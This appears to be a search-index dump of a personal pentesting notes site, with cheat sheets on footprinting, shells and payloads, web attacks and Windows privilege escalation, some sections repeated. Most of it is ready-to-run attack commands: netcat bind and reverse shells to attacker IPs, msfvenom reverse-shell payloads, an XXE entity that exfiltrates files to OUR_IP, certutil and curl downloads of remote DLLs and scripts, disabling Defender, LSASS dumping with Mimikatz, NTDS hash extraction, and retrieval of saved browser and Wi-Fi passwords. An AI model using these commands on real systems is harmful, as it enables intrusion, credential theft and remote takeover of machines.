auxiliary(scanner/ipmi/ipmi_version) IPMI version detection. msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) Dump IPMI hashes.","title":"IPMI"},{"location":"cheat_sheets/footprinting/#linux-remote-management","text":"Command Description ssh-audit.py <FQDN/IP> Remote security audit against the target SSH service. ssh <user>@<FQDN/IP> Log in to the SSH server using the SSH client. ssh -i private.key <user>@<FQDN/IP> Log in to the SSH server using private key. ssh <user>@<FQDN/IP> -o PreferredAuthentications=password Enforce password-based authentication.","title":"Linux Remote Management"},{"location":"cheat_sheets/footprinting/#windows-remote-management","text":"Command Description rdp-sec-check.pl <FQDN/IP> Check the security settings of the RDP service. xfreerdp /u:<user> /p:\"<password>\" /v:<FQDN/IP> Log in to the RDP server from Linux. evil-winrm -i <FQDN/IP> -u <user> -p <password> Log in to the WinRM server. wmiexec.py <user>:\"<password>\"@<FQDN/IP> \"<system command>\" Execute command using the WMI service.","title":"Windows Remote Management"},{"location":"cheat_sheets/linux_shortcuts/","text":"Cursor Movement [CTRL] + A - Move the cursor to the beginning of the current line. [CTRL] + E - Move the cursor to the end of the current line. [CTRL] + [\u2190] / [\u2192] - Jump at the beginning of the current/previous word. [ALT] + B / F - Jump backward/forward one word. Erase The Current Line [CTRL] + U - Erase everything from the current position of the cursor to the beginning of the line. [Ctrl] + K - Erase everything from the current position of the cursor to the end of the line. [Ctrl] + W - Erase the word preceding the cursor position. Paste Erased Contents [Ctrl] + Y - Pastes the erased text or word. Ends Task [CTRL] + C - Ends the current task/process by sending the SIGINT signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation. End-of-File (EOF) [CTRL] + D - Close STDIN pipe that is also known as End-of-File (EOF) or End-of-Transmission. Clear Terminal [CTRL] + L - Clears the terminal. An alternative to this shortcut is the clear command you can type to clear our terminal. Background a Process [CTRL] + Z - Suspend the current process by sending the SIGTSTP signal. Search Through Command History [CTRL] + R - Search through command history for commands we typed previously that match our search patterns. [\u2191] / [\u2193] - Go to the previous/next command in the command history. Switch Between Applications [ALT] + [TAB] - Switch between opened applications. Zoom [CTRL] + [+] - Zoom in. [CTRL] + [-] - Zoom out.","title":"Linux Shortcuts"},{"location":"cheat_sheets/shells_payloads/","text":"Commands Description xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt! CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol env Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use sudo nc -lvnp <port #> Starts a netcat listener on a specified port nc -nv <ip address of computer with listener started><port being listened on> Connects to a netcat listener at the specified IP address and port rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \\| /bin/bash -i 2>&1 \\| nc -l 10.129.41.200 7777 > /tmp/f Uses netcat to bind a shell ( /bin/bash ) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on Set-MpPreference -DisableRealtimeMonitoring $true Powershell command using to disable real time monitoring in Windows Defender use exploit/windows/smb/psexec Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec shell Command used in a meterpreter shell session to drop into a system shell msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf MSFvenom command used to generate a linux-based reverse shell stageless payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe MSFvenom command used to generate a Windows-based reverse shell stageless payload msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho MSFvenom command used to generate a MacOS-based reverse shell payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp MSFvenom command used to generate a ASP web reverse shell payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp MSFvenom command used to generate a JSP web reverse shell payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload use auxiliary/scanner/smb/smb_ms17_010 Metasploit exploit module used to check if a host is vulnerable to ms17_010 use exploit/windows/smb/ms17_010_psexec Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010 use exploit/linux/http/rconfig_vendors_auth_file_upload_rce Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6 python -c 'import pty; pty.spawn(\"/bin/sh\")' Python command used to spawn an interactive shell on a linux-based system /bin/sh -i Spawns an interactive shell on a linux-based system perl \u2014e 'exec \"/bin/sh\";' Uses perl to spawn an interactive shell on a linux-based system ruby: exec \"/bin/sh\" Uses ruby to spawn an interactive shell on a linux-based system Lua: os.execute('/bin/sh') Uses Lua to spawn an interactive shell on a linux-based system awk 'BEGIN {system(\"/bin/sh\")}' Uses awk command to spawn an interactive shell on a linux-based system find / -name nameoffile 'exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\; Uses find command to spawn an interactive shell on a linux-based system find . -exec /bin/sh \\; -quit An alternative way to use the find command to spawn an interactive shell on a linux-based system vim -c ':!/bin/sh' Uses the text-editor VIM to spawn an interactive shell. Can be used to escape \"jail-shells\" ls -la <path/to/fileorbinary> Used to list files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute sudo -l Displays the commands that the currently logged on user can run as sudo /usr/share/webshells/laudanum Location of laudanum webshells on ParrotOS and Pwnbox /usr/share/nishang/Antak-WebShell Location of Antak-Webshell on Parrot OS and Pwnbox","title":"Shells & Payloads"},{"location":"cheat_sheets/web_attacks/","text":"HTTP Verb Tampering \u00b6 HTTP Method - HEAD - PUT - DELETE - OPTIONS - PATCH Command Description -X OPTIONS Set HTTP Method with Curl IDOR \u00b6 Identify IDORS - In URL parameters & APIs - In AJAX Calls - By understanding reference hashing/encoding - By comparing user roles Command Description md5sum MD5 hash a string base64 Base64 encode a string XXE \u00b6 Code Description <!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"> Define External Entity to a URL <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> Define External Entity to a file path <!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> Read PHP source code with base64 encode filter <!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>\"> Reading a file through a PHP error <!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\"> Reading a file OOB exfiltration","title":"Web Attacks"},{"location":"cheat_sheets/web_attacks/#http-verb-tampering","text":"HTTP Method - HEAD - PUT - DELETE - OPTIONS - PATCH Command Description -X OPTIONS Set HTTP Method with Curl","title":"HTTP Verb Tampering"},{"location":"cheat_sheets/web_attacks/#idor","text":"Identify IDORS - In URL parameters & APIs - In AJAX Calls - By understanding reference hashing/encoding - By comparing user roles Command Description md5sum MD5 hash a string base64 Base64 encode a string","title":"IDOR"},{"location":"cheat_sheets/web_attacks/#xxe","text":"Code Description <!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"> Define External Entity to a URL <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> Define External Entity to a file path <!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> Read PHP source code with base64 encode filter <!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>\"> Reading a file through a PHP error <!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\"> Reading a file OOB exfiltration","title":"XXE"},{"location":"cheat_sheets/web_requests/","text":"Command Description curl http://inlanefreight.com GET request with cURL curl http://inlanefreight.com -v Verbose GET request with cURL curl http://admin:password@inlanefreight.com/ -vvv cURL Basic Auth login curl -u admin:password http://inlanefreight.com/ -vvv Alternate cURL Basic Auth login curl -u admin:password -L http://inlanefreight.com/ cURL Basic Auth login, follow redirection curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us' cURL GET request with parameter curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php POST request with cURL curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php -v Debugging with cURL curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v Cookie usage with cURL curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php cURL with cookie file curl -H 'Content-Type: application/json' -d '{ \"username\" : \"admin\", \"password\" : \"password\" }' cURL specify content type curl -X OPTIONS http://inlanefreight.com/ -vv cURL OPTIONS request curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv File upload with cURL curl -X DELETE http://inlanefreight.com/test.txt -vv DELETE method with cURL","title":"Web requests"},{"location":"cheat_sheets/win_privesc/","text":"Initial Enumeration \u00b6 Command Description xfreerdp /v:<target ip> /u:htb-student RDP to lab target ipconfig /all Get interface, IP address and DNS information arp -a Review ARP table route print Review routing table Get-MpComputerStatus Check Windows Defender status Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections List AppLocker rules Get-AppLockerPolicy -Local \\| Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone Test AppLocker policy set Display all environment variables systeminfo View detailed system configuration information wmic qfe Get patches and updates wmic product get name Get installed programs tasklist /svc Display running processes query user Get logged-in users echo %USERNAME% Get current user whoami /priv View current user privileges whoami /groups View current user group information net user Get all system users net localgroup Get all system groups net localgroup administrators View details about a group net accounts Get passsword policy netstat -ano Display active network connections pipelist.exe /accepteula List named pipes gci \\\\.\\pipe\\ List named pipes with PowerShell accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v Review permissions on a named pipe Handy Commands \u00b6 Command Description mssqlclient.py sql_dev@10.129.43.30 -windows-auth Connect using mssqlclient.py enable_xp_cmdshell Enable xp_cmdshell with mssqlclient.py xp_cmdshell whoami Run OS commands with xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\" -t * Escalate privileges with JuicyPotato c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\" Escalating privileges with PrintSpoofer procdump.exe -accepteula -ma lsass.exe lsass.dmp Take memory dump with ProcDump sekurlsa::minidump lsass.dmp and sekurlsa::logonpasswords Use MimiKatz to extract credentials from LSASS memory dump dir /q C:\\backups\\wwwroot\\web.config Checking ownership of a file takeown /f C:\\backups\\wwwroot\\web.config Taking ownership of a file Get-ChildItem -Path \u2018C:\\backups\\wwwroot\\web.config\u2019 \\| select name,directory, @{Name=\u201cOwner\u201d;Expression={(Ge t-ACL $_.Fullname).Owner}} Confirming changed ownership of a file icacls \u201cC:\\backups\\wwwroot\\web.config\u201d /grant htb-student:F Modifying a file ACL secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Extract hashes with secretsdump.py robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit Copy files with ROBOCOPY wevtutil qe Security /rd:true /f:text \\| Select-String \"/user\" Searching security event logs wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \\| findstr \"/user\" Passing credentials to wevtutil Get-WinEvent -LogName security \\| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \\| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} Searching event logs with PowerShell msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll Generate malicious DLL dnscmd.exe /config /serverlevelplugindll adduser.dll Loading a custom DLL with dnscmd wmic useraccount where name=\"netadm\" get sid Finding a user's SID sc.exe sdshow DNS Checking permissions on DNS service sc stop dns Stopping a service sc start dns Starting a service reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters Querying a registry key reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll Deleting a registry key sc query dns Checking a service status Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local Disabling the global query block list Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3 Adding a WPAD record cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp Compile with cl.exe reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\" Add reference to a driver (1) reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1 Add reference to a driver (2) .\\DriverView.exe /stext drivers.txt and cat drivers.txt \\| Select-String -pattern Capcom Check if driver is loaded EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys Using EopLoadDriver c:\\Tools\\PsService.exe security AppReadiness Checking service permissions with PsService sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\" Modifying a service binary path REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA Confirming UAC is enabled REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin Checking UAC level [environment]::OSVersion.Version Checking Windows version cmd /c echo %PATH% Reviewing path variable curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\" Downloading file with cURL in PowerShell rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll Executing custom dll with rundll32.exe .\\SharpUp.exe audit Running SharpUp icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" Checking service permissions with icacls cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" Replace a service binary wmic service get name,displayname,pathname,startmode \\| findstr /i \"auto\" \\| findstr /i /v \"c:\\windows\\\\\" \\| findstr /i /v \"\"\" Searching for unquoted service paths accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services Checking for weak service ACLs in the Registry Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\" Changing ImagePath with PowerShell Get-CimInstance Win32_StartupCommand \\| select Name, command, Location, User \\| fl Check startup programs msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe Generating a malicious binary get-process -Id 3324 Enumerating a process ID with PowerShell get-service \\| ? {$_.DisplayName -like 'Druva*'} Enumerate a running service by name with PowerShell Credential Theft \u00b6 Command Description findstr /SIM /C:\"password\" *.txt *ini *.cfg *.config *.xml Search for files with the phrase \"password\" gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' \\| Select-String password Searching for passwords in Chrome dictionary files (Get-PSReadLineOption).HistorySavePath Confirm PowerShell history save path gc (Get-PSReadLineOption).HistorySavePath Reading PowerShell history file $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml' Decrypting PowerShell credentials cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt Searching file contents for a string findstr /si password *.xml *.ini *.txt *.config Searching file contents for a string findstr /spin \"password\" *.* Searching file contents for a string select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password Search file contents with PowerShell dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* Search for file extensions where /R C:\\ *.config Search for file extensions Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore Search for file extensions using PowerShell cmdkey /list List saved credentials .\\SharpChrome.exe logins /unprotect Retrieve saved Chrome credentials .\\lazagne.exe -h View LaZagne help menu .\\lazagne.exe all Run all LaZagne modules Invoke-SessionGopher -Target WINLPE-SRV01 Running SessionGopher netsh wlan show profile View saved wireless networks netsh wlan show profile ilfreight_corp key=clear Retrieve saved wireless passwords Other Commands \u00b6 Command Description certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat Transfer file with certutil certutil -encode file1 encodedfile Encode file with certutil certutil -decode encodedfile file2 Decode file with certutil reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer Query for always install elevated registry key (1) reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Query for always install elevated registry key (2) msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi Generate a malicious MSI package msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart Executing an MSI package from command line schtasks /query /fo LIST /v Enumerate scheduled tasks Get-ScheduledTask \\| select TaskName,State Enumerate scheduled tasks with PowerShell .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\ Check permissions on a directory Get-LocalUser Check local user description field Get-WmiObject -Class Win32_OperatingSystem \\| select Description Enumerate computer description field guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd Mount VMDK on Linux guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1 Mount VHD/VHDX on Linux sudo python2.7 windows-exploit-suggester.py --update Update Windows Exploit Suggester database python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt Running Windows Exploit Suggester","title":"Windows Privilege Escalation"},{"location":"cheat_sheets/win_privesc/#initial-enumeration","text":"Command Description xfreerdp /v:<target ip> /u:htb-student RDP to lab target ipconfig /all Get interface, IP address and DNS information arp -a Review ARP table route print Review routing table Get-MpComputerStatus Check Windows Defender status Get-AppLockerPolicy -Effective \\| select -ExpandProperty RuleCollections List AppLocker rules Get-AppLockerPolicy -Local \\| Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone Test AppLocker policy set Display all environment variables systeminfo View detailed system configuration information wmic qfe Get patches and updates wmic product get name Get installed programs tasklist /svc Display running processes query user Get logged-in users echo %USERNAME% Get current user whoami /priv View current user privileges whoami /groups View current user group information net user Get all system users net localgroup Get all system groups net localgroup administrators View details about a group net accounts Get passsword policy netstat -ano Display active network connections pipelist.exe /accepteula List named pipes gci \\\\.\\pipe\\ List named pipes with PowerShell accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v Review permissions on a named pipe","title":"Initial Enumeration"},{"location":"cheat_sheets/win_privesc/#handy-commands","text":"Command Description mssqlclient.py sql_dev@10.129.43.30 -windows-auth Connect using mssqlclient.py enable_xp_cmdshell Enable xp_cmdshell with mssqlclient.py xp_cmdshell whoami Run OS commands with xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 443 -e cmd.exe\" -t * Escalate privileges with JuicyPotato c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\" Escalating privileges with PrintSpoofer procdump.exe -accepteula -ma lsass.exe lsass.dmp Take memory dump with ProcDump sekurlsa::minidump lsass.dmp and sekurlsa::logonpasswords Use MimiKatz to extract credentials from LSASS memory dump dir /q C:\\backups\\wwwroot\\web.config Checking ownership of a file takeown /f C:\\backups\\wwwroot\\web.config Taking ownership of a file Get-ChildItem -Path \u2018C:\\backups\\wwwroot\\web.config\u2019 \\| select name,directory, @{Name=\u201cOwner\u201d;Expression={(Ge t-ACL $_.Fullname).Owner}} Confirming changed ownership of a file icacls \u201cC:\\backups\\wwwroot\\web.config\u201d /grant htb-student:F Modifying a file ACL secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Extract hashes with secretsdump.py robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit Copy files with ROBOCOPY wevtutil qe Security /rd:true /f:text \\| Select-String \"/user\" Searching security event logs wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \\| findstr \"/user\" Passing credentials to wevtutil Get-WinEvent -LogName security \\| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \\| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} Searching event logs with PowerShell msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll Generate malicious DLL dnscmd.exe /config /serverlevelplugindll adduser.dll Loading a custom DLL with dnscmd wmic useraccount where name=\"netadm\" get sid Finding a user's SID sc.exe sdshow DNS Checking permissions on DNS service sc stop dns Stopping a service sc start dns Starting a service reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters Querying a registry key reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll Deleting a registry key sc query dns Checking a service status Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local Disabling the global query block list Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3 Adding a WPAD record cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp Compile with cl.exe reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\" Add reference to a driver (1) reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1 Add reference to a driver (2) .\\DriverView.exe /stext drivers.txt and cat drivers.txt \\| Select-String -pattern Capcom Check if driver is loaded EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys Using EopLoadDriver c:\\Tools\\PsService.exe security AppReadiness Checking service permissions with PsService sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\" Modifying a service binary path REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA Confirming UAC is enabled REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin Checking UAC level [environment]::OSVersion.Version Checking Windows version cmd /c echo %PATH% Reviewing path variable curl http://10.10.14.3:8080/srrstr.dll -O \"C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\" Downloading file with cURL in PowerShell rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll Executing custom dll with rundll32.exe .\\SharpUp.exe audit Running SharpUp icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" Checking service permissions with icacls cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" Replace a service binary wmic service get name,displayname,pathname,startmode \\| findstr /i \"auto\" \\| findstr /i /v \"c:\\windows\\\\\" \\| findstr /i /v \"\"\" Searching for unquoted service paths accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services Checking for weak service ACLs in the Registry Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\" Changing ImagePath with PowerShell Get-CimInstance Win32_StartupCommand \\| select Name, command, Location, User \\| fl Check startup programs msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe Generating a malicious binary get-process -Id 3324 Enumerating a process ID with PowerShell get-service \\| ? {$_.DisplayName -like 'Druva*'} Enumerate a running service by name with PowerShell","title":"Handy Commands"},{"location":"cheat_sheets/win_privesc/#credential-theft","text":"Command Description findstr /SIM /C:\"password\" *.txt *ini *.cfg *.config *.xml Search for files with the phrase \"password\" gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' \\| Select-String password Searching for passwords in Chrome dictionary files (Get-PSReadLineOption).HistorySavePath Confirm PowerShell history save path gc (Get-PSReadLineOption).HistorySavePath Reading PowerShell history file $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml' Decrypting PowerShell credentials cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt Searching file contents for a string findstr /si password *.xml *.ini *.txt *.config Searching file contents for a string findstr /spin \"password\" *.* Searching file contents for a string select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password Search file contents with PowerShell dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* Search for file extensions where /R C:\\ *.config Search for file extensions Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore Search for file extensions using PowerShell cmdkey /list List saved credentials .\\SharpChrome.exe logins /unprotect Retrieve saved Chrome credentials .\\lazagne.exe -h View LaZagne help menu .\\lazagne.exe all Run all LaZagne modules Invoke-SessionGopher -Target WINLPE-SRV01 Running SessionGopher netsh wlan show profile View saved wireless networks netsh wlan show profile ilfreight_corp key=clear Retrieve saved wireless passwords","title":"Credential Theft"},{"location":"cheat_sheets/win_privesc/#other-commands","text":"Command Description certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat Transfer file with certutil certutil -encode file1 encodedfile Encode file with certutil certutil -decode encodedfile file2 Decode file with certutil reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer Query for always install elevated registry key (1) reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Query for always install elevated registry key (2) msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi Generate a malicious MSI package msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart Executing an MSI package from command line schtasks /query /fo LIST /v Enumerate scheduled tasks Get-ScheduledTask \\| select TaskName,State Enumerate scheduled tasks with PowerShell .\\accesschk64.exe /accepteula -s -d C:\\Scripts\\ Check permissions on a directory Get-LocalUser Check local user description field Get-WmiObject -Class Win32_OperatingSystem \\| select Description Enumerate computer description field guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd Mount VMDK on Linux guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1 Mount VHD/VHDX on Linux sudo python2.7 windows-exploit-suggester.py --update Update Windows Exploit Suggester database python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt Running Windows Exploit Suggester","title":"Other Commands"},{"location":"cheat_sheets/windows/","text":"Command Description xfreerdp /v:<target IP address> /u:htb-student /p:<password> RDP to lab target Get-WmiObject -Class win32_OperatingSystem Get information about the operating system dir c:\\ /a View all files and directories in the c: root directory tree <directory> Graphically displaying the directory structure of a path tree c:\\ /f \\| more Walk through results of the tree command page by page icacls <directory> View the permissions set on a directory icacls c:\\users /grant joe:f Grant a user full permissions to a directory icacls c:\\users /remove joe Remove a users' permissions on a directory Get-Service PowerShell cmdlet to view running services help <command> Display the help menu for a specific command get-alias List PowerShell aliases New-Alias -Name \"Show-Files\" Get-ChildItem Create a new PowerShell alias Get-Module \\| select Name,ExportedCommands \\| fl View imported PowerShell modules and their associated commands Get-ExecutionPolicy -List View the PowerShell execution policy Set-ExecutionPolicy Bypass -Scope Process Set the PowerShell execution policy to bypass for the current session wmic os list brief Get information about the operating system with wmic Invoke-WmiMethod Call methods of WMI objects whoami /user View the current users' SID reg query <key> View information about a registry key Get-MpComputerStatus Check which Defender protection settings are enabled sconfig Load Server Configuration menu in Windows Server Core","title":"Windows"},{"location":"docs/","text":"Introduction \u00b6 Disclaimer \u00b6 The content provided on SecOps.cc is for informational and educational purpose only. You shall not misuse the information to gain unauthorised access or conduct any actions which violate law. I only use these docs for hackthebox machines, CTFs and as a knowledge base for certifications. Ethicalhacking \u2192 What is this? \u00b6 \ud83d\udc49 A collection of notes I created working on pentests, security reviews, trainings, studying in general or doing some bug bounty and CTFs. Purpose? \u00b6 \ud83d\udc49 Quickly lookup things such as commands which I tend to forget. Build a primary knowledge base. Updates? \u00b6 \ud83d\udc49 This is a work in progress. I will add things as I come across them. Contact? \u00b6 \ud83d\udc49 If you have a question, or a comment - or if you just want to say hello - please do so.","title":"Introduction"},{"location":"docs/#introduction","text":"","title":"Introduction"},{"location":"docs/#disclaimer","text":"The content provided on SecOps.cc is for informational and educational purpose only. You shall not misuse the information to gain unauthorised access or conduct any actions which violate law. I only use these docs for hackthebox machines, CTFs and as a knowledge base for certifications. Ethicalhacking \u2192","title":"Disclaimer"},{"location":"docs/#what-is-this","text":"\ud83d\udc49 A collection of notes I created working on pentests, security reviews, trainings, studying in general or doing some bug bounty and CTFs.","title":"What is this?"},{"location":"docs/#purpose","text":"\ud83d\udc49 Quickly lookup things such as commands which I tend to forget. Build a primary knowledge base.","title":"Purpose?"},{"location":"docs/#updates","text":"\ud83d\udc49 This is a work in progress. I will add things as I come across them.","title":"Updates?"},{"location":"docs/#contact","text":"\ud83d\udc49 If you have a question, or a comment - or if you just want to say hello - please do so.","title":"Contact?"},{"location":"file_analysis/useful_links/","text":"Useful \u00b6 urlscan.io any.run VirusTotal intezer","title":"File Analysis"},{"location":"file_analysis/useful_links/#useful","text":"urlscan.io any.run VirusTotal 